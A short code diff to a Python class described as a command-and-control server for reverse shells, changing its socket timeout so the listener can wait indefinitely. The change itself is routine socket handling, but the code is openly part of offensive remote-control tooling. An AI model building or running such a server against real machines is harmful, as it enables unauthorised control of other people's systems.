@@ -7,7 +7,7 @@ class Server(object):
     """
     A simple command and control server(Reverse Shell).
     """
-    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, timeout=15.0):
+    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5, timeout=-1):
         header = """\n .oOOOo.
 .O     o.
 O       o               O
@@ -35,8 +35,16 @@ o       O o   O `Ooo.   O   OooO'  o
             print('Could not create socket:', error_message)
             sys.exit()
 
-        self.timeout = float(timeout)
-        self.s.settimeout(self.timeout)
+        times_out = True
+        if int(timeout) == -1:
+            times_out = False
+
+        if times_out:
+            self.timeout = float(timeout)
+            self.s.settimeout(self.timeout)
+        else:
+            self.timeout = None
+            self.s.settimeout(None)
 
         # Bind the socket
         self._bind_the_socket()
